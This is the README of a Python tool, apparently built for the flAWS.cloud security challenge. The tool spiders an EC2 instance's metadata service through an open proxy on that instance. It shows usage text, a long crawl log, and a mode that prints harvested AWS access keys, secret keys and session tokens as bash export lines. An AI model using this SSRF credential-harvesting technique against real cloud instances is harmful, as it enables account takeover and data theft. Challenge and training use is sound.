# aws-imds-spider
Spiders the AWS EC2 IMDS API using a proxy on that EC2.

_Software is still in development phase, used only for an AWS security challenge_


## python3 spider-imds.py -h
Shows the help

```
$ python3 spider-imds.py -h
usage: Scan IMDS [-h] [-p PROXY] [-o OUTPUT] [-ii] [-c]

options:
  -h, --help            show this help message and exit
  -p PROXY, --proxy PROXY
                        base url for IMDS
  -o OUTPUT, --output OUTPUT
                        write json to the file
  -ii, --instance-identity
                        only instance-identity
  -c, --creds           print env script with creds
```

## python3 spider-imds.py --proxy http://someec2/proxy
Uses the proxy application on the EC2 to get to the IMDS endpoint of that EC2.

Note that for the http://flAWS.cloud challenge, this proxy is currently hard-coded. 
So change that in the code before using it for another proxy.

## python3 spider-imds.py --output imds.json
Writes the collected json structure to the file.

See the example file stored in this repo.

Logs while spidering:
```
[+] Get /latest ... OK
[+] Get /latest/dynamic ... OK
[+] Get /latest/dynamic/instance-identity ... OK
[+] Get /latest/dynamic/instance-identity/signature ... OK
[+] Get /latest/dynamic/instance-identity/rsa2048 ... OK
[+] Get /latest/dynamic/instance-identity/document ... OK
[+] Get /latest/dynamic/instance-identity/pkcs7 ... OK
[+] Get /latest/meta-data ... OK
[+] Get /latest/meta-data/ami-id ... OK
[+] Get /latest/meta-data/ami-id/ami-7c803d1c ... OK
[+] Get /latest/meta-data/ami-launch-index ... OK
[+] Get /latest/meta-data/ami-launch-index/0 ... OK
[+] Get /latest/meta-data/ami-manifest-path ... OK
[+] Get /latest/meta-data/ami-manifest-path/(unknown) ... OK
[+] Get /latest/meta-data/block-device-mapping ... OK
[+] Get /latest/meta-data/block-device-mapping/ami ... OK
[+] Get /latest/meta-data/block-device-mapping/ami//dev/sda1 ... OK
[+] Get /latest/meta-data/block-device-mapping/root ... OK
[+] Get /latest/meta-data/block-device-mapping/root//dev/sda1 ... OK
[+] Get /latest/meta-data/events ... OK
[+] Get /latest/meta-data/events/maintenance ... OK
[+] Get /latest/meta-data/events/maintenance/history ... OK
[+] Get /latest/meta-data/events/maintenance/history/[] ... OK
[+] Get /latest/meta-data/events/maintenance/scheduled ... OK
[+] Get /latest/meta-data/events/maintenance/scheduled/[] ... OK
[+] Get /latest/meta-data/hostname ... OK
[+] Get /latest/meta-data/hostname/ip-172-31-41-84.us-west-2.compute.internal ... OK
[+] Get /latest/meta-data/iam ... OK
[+] Get /latest/meta-data/iam/info ... OK
[+] Get /latest/meta-data/iam/security-credentials ... OK
[+] Get /latest/meta-data/iam/security-credentials/flaws ... OK
[+] Get /latest/meta-data/identity-credentials ... OK
[+] Get /latest/meta-data/identity-credentials/ec2 ... OK
[+] Get /latest/meta-data/identity-credentials/ec2/info ... OK
[+] Get /latest/meta-data/identity-credentials/ec2/security-credentials ... OK
[+] Get /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance ... OK
[+] Get /latest/meta-data/instance-action ... OK
[+] Get /latest/meta-data/instance-action/none ... OK
[+] Get /latest/meta-data/instance-id ... OK
[+] Get /latest/meta-data/instance-id/i-05bef8a081f307783 ... OK
[+] Get /latest/meta-data/instance-life-cycle ... OK
[+] Get /latest/meta-data/instance-life-cycle/on-demand ... OK
[+] Get /latest/meta-data/instance-type ... OK
[+] Get /latest/meta-data/instance-type/t2.micro ... OK
[+] Get /latest/meta-data/local-hostname ... OK
[+] Get /latest/meta-data/local-hostname/ip-172-31-41-84.us-west-2.compute.internal ... OK
[+] Get /latest/meta-data/local-ipv4 ... OK
[+] Get /latest/meta-data/local-ipv4/172.31.41.84 ... OK
[+] Get /latest/meta-data/mac ... OK
[+] Get /latest/meta-data/mac/06:b0:7a:92:21:cf ... OK
[+] Get /latest/meta-data/metrics ... OK
[+] Get /latest/meta-data/metrics/vhostmd ... OK
[+] Get /latest/meta-data/network ... OK
[+] Get /latest/meta-data/network/interfaces ... OK
[+] Get /latest/meta-data/network/interfaces/macs ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/device-number ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/device-number/0 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/interface-id ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/interface-id/eni-c26ed780 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/ipv4-associations ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/ipv4-associations/35.165.182.7 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/ipv4-associations/35.165.182.7/172.31.41.84 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/local-hostname ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/local-hostname/ip-172-31-41-84.us-west-2.compute.internal ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/local-ipv4s ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/local-ipv4s/172.31.41.84 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/mac ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/mac/06:b0:7a:92:21:cf ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/owner-id ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/owner-id/975426262029 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/public-hostname ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/public-hostname/ec2-35-165-182-7.us-west-2.compute.amazonaws.com ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/public-ipv4s ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/public-ipv4s/35.165.182.7 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/security-group-ids ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/security-group-ids/sg-490f6631 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/security-groups ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/security-groups/launch-wizard-1 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/subnet-id ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/subnet-id/subnet-d962aa90 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/subnet-ipv4-cidr-block ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/subnet-ipv4-cidr-block/172.31.32.0/20 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-id ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-id/vpc-1052ce77 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-ipv4-cidr-block ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-ipv4-cidr-block/172.31.0.0/16 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-ipv4-cidr-blocks ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-ipv4-cidr-blocks/172.31.0.0/16 ... OK
[+] Get /latest/meta-data/placement ... OK
[+] Get /latest/meta-data/placement/availability-zone ... OK
[+] Get /latest/meta-data/placement/availability-zone/us-west-2a ... OK
[+] Get /latest/meta-data/placement/region ... OK
[+] Get /latest/meta-data/placement/region/us-west-2 ... OK
[+] Get /latest/meta-data/profile ... OK
[+] Get /latest/meta-data/profile/default-hvm ... OK
[+] Get /latest/meta-data/public-hostname ... OK
[+] Get /latest/meta-data/public-hostname/ec2-35-165-182-7.us-west-2.compute.amazonaws.com ... OK
[+] Get /latest/meta-data/public-ipv4 ... OK
[+] Get /latest/meta-data/public-ipv4/35.165.182.7 ... OK
[+] Get /latest/meta-data/public-keys ... OK
[+] Get /latest/meta-data/public-keys/0=Default ... OK
[+] Get /latest/meta-data/reservation-id ... OK
[+] Get /latest/meta-data/reservation-id/r-0fe151dbbe77e90cc ... OK
[+] Get /latest/meta-data/security-groups ... OK
[+] Get /latest/meta-data/security-groups/launch-wizard-1 ... OK
[+] Get /latest/meta-data/services ... OK
[+] Get /latest/meta-data/services/domain ... OK
[+] Get /latest/meta-data/services/domain/amazonaws.com ... OK
[+] Get /latest/meta-data/services/partition ... OK
[+] Get /latest/meta-data/services/partition/aws ... OK
[+] Get /latest/user-data ... OK
```

The JSON is not shown when the output file is configured.


## python3 spider-imds.py --instance-identity
Only collect the EC2 instance-identity, so doesn't spider.

Example:
```
[+] Get latest/dynamic/instance-identity/document ... OK
{
    "latest/dynamic/instance-identity": "document",
    "latest/dynamic/instance-identity/document": {
        "accountId": "975426262029",
        "architecture": "x86_64",
        "availabilityZone": "us-west-2a",
        "billingProducts": null,
        "devpayProductCodes": null,
        "marketplaceProductCodes": null,
        "imageId": "ami-7c803d1c",
        "instanceId": "i-05bef8a081f307783",
        "instanceType": "t2.micro",
        "kernelId": null,
        "pendingTime": "2017-02-12T22:29:24Z",
        "privateIp": "172.31.41.84",
        "ramdiskId": null,
        "region": "us-west-2",
        "version": "2017-09-30"
    }
}
Finished.
```

## python3 spider-imds.py --creds
Only collects http://flAWS.cloud specific access keys; two different sets.
Displays the collected info as a bash script with variable exports.
Uses the `aws cli` environment variables.

Output are lines of bash script to copy:
```
[+] Get latest/dynamic/instance-identity/document ... OK
[+] Get latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance ... OK
[+] Get latest/meta-data/iam/security-credentials/flaws ... OK
echo Copy these aws cli credentials for http://flAWS.cloud challenge
export ACCOUNT_ID=975426262029
export INSTANCE_ID=i-05bef8a081f307783
export AWS_DEFAULT_REGION=us-west-2
# profile ec2-instance
export AWS_ACCESS_KEY_ID=ASIA6GG7PSQGXVUYRU6T
export AWS_SECRET_ACCESS_KEY=hwGUlbdJoktrmY0le9UAC//oieoI3m7VMKyj6m4l
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCIBlyWGzSvtOgf9zV1f1I1D0F4K2m4i+u1CZq1iQ5FBY/AiBLrRmeYRLTDnazWVZyOKaUnMUbwtVEz2S9HoiYTqz+DSqoBAheEAMaDDk3NTQyNjI2MjAyOSIMzDAMwXbpxmu0P2GmKoUE3TVHqo84C2gkbtOLxDq67gOrfz2SoPLuAZwqBKVEzjoFMM8/VoHToCSt4pWQhBOHjr7OvpSY6Mr54ooRDLbt4WgAZ4jJ37g6z1JNSQpxQD3Pp3FLz/7BelDegpPGv8u9DUJBxEfO4JlXEezS+LXcOEdrlvECvtxTJx5IKfpV/ZCuIKoCx4Yk9Zofmeuk4BegosdJfG5OmNNDjD1Brvx9mM64OtYeXLjNroYWNjsuXN4wDM3ezEoIOwgGnXcpRathbzdygnOLoDD+xujo6KOcq+yZzHjFqMBf0KgD/4yYUSxKw95CbgS4HPW4MEjMDenYHuHBxDe4O9qrMmfHmsUJlMbKAo8pir1hQF2MXDoLsjPxyN0YQqVEKqRUkzQaf65I765P18n1cg2jnhh4nKmVkzC2BcMQjYRKrPVQV+xrWvnOe7ERSpGvCl2IEs4wDNnNilV+QEHW9sblD1sbTCGyXkmhHUBdaSrg/qIgbgmCu7yB/rcutWswaGrsr8hF/r7VcuzfTeyMROe2lcPZEIQIHbfMailjItu/s9xFn/sgUDXyYyWuSjaMDE8Ge8qE/3TJ3E0+c/D+e1uNJxNW2VqPEOV5WUQQ7gtwibhfw0NvoUPDsIxl6y5yGQ1TvTIf2AExXbPWF+mtXJSKF7AH3VQLYNGLsBVcaPi44tdbmm/Y+LruwINaETDGgoGWBjqQAlpPd8RS+cWSmA+U9lG89lZuV7XmwnimHGAAUuJYB4G1o40ZTBD9I3YDu6QdWQULX7pwbYRCeFBMdIGm3Hj4VswwF6NejsmES0yFJZ4Eo2UinGuDfM4mJWZ7xPs10vHn1eA9fu5v/P1kQQT5rXANRNHQIw/AnPvRPaARTfwGAqdMeA16Zv0bj+YVBW1zRrs3LXQlwpLaU/itITCiHkCB9DmEUSfQI5/74PqLjNqXextHTQrWNyUgJDQrYAFGcNnr0cvY+QZTcP/2X253HnSfRN3jT01Tw4FqvFhZPUrMfAlu/4PRehAJff2CDjMOntnTuHYIgNwd8eE/xFJAuHo3Qp73wXfC+LExHF80fF4dmkaP
# profile flaws
export AWS_ACCESS_KEY_ID=ASIA6GG7PSQGXWUVFNMH
export AWS_SECRET_ACCESS_KEY=XY/+z5m9N3ZZVmfAlh+FHWrxk71Z1OETgHK7SFCe
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCIGadvHeU7sQBMG65XcNjGr4pYjGevCSOtC2/O5M++K+IAiAkp1CLS/R2SH32NI6PuwTUPH73R1bqwZjQoTAeVX1SHSrSBAheEAMaDDk3NTQyNjI2MjAyOSIMbNAJ8n708IERJDQrKq8ESiqxNCGaLvdOXz519z41A2T/FIENkLNwsI76QXF20WqX499TPm94Puv3QF7ZNic5neWRDEUuqCj4eDTUhfDQbptvbIyovz4f5OUTYhb0zgyOphVt8Om1DMPCuYrW0OylkhMMd0vIAtyYzqZFZIcd7nl5MoTFFGnseRuK4eK1uAJ7EyA4420Ln0Tl60Lrf629K6LajDwOsW2Nxyh6Hx36RMkdnFJZoIIeu5vo4Qw2d1YOHWvC8vzOQeNzE9mbDT/r/mlq28kboXSMFfgmADzL14XCwCjfxw1FN+3C83K3ERD0vj0yMCNq9FzjT11lJHvEibF6MZiH3aMqmyh27DXMrq7iqJATw11ssjfiKw6T+B8rB5mxAdTwM6gjcb+z+wgYcCbROIvs6ok0BT8y8BZIe/U7lfFTjf4s3kLZlnlXvX0ESq608e28zOGMRkGLxJ27u4ULMHT59hAVNEnk3QFfGttmydjId+nQRvNapf6srSxF4ql1mUfYS+oxJvv3UAu9eY6ikYv21cAmQ6KEG76smcDA4v9zWtbGMrpx/3A0F+y9UPWvpD5k/oU9J8RG1J76OyEMybvW8R92z8Y2NZ9FKQIkDrhNYINmjw1xRyhfygHqw46PZEyqSPjpZzjDo2/rskzpdxglYT44R253xsQaueTUEu4BtNWl3tSCred7nVdjpNcKUSmF0vh1xpyAQeO6aKi2ZtDmkIHfrdp7yDVjuAVT1YNwXC/Yw1ZktNFTqDDGgoGWBjqqAXM92sGxSCXtJQfWUN7/8EmbhYsNTOoP8ijPUuCNI+FLXBnW9gOyZcg1QPgzJS0ExxWJV14AMSlcYsFkx4cKcxdGLmCMfuXofhjc4fUddgNbBcWKfAYJmVpCHnZJSjnGUA+IlB1AtCgmVkRVPq/WHxQvfqlzYNt3XXaprHA/BrftLYjxutnMwMghPvrx0ixzkfDgO7+7J9taWrzHtIiZyS0qpFa2dlasnGJM
```



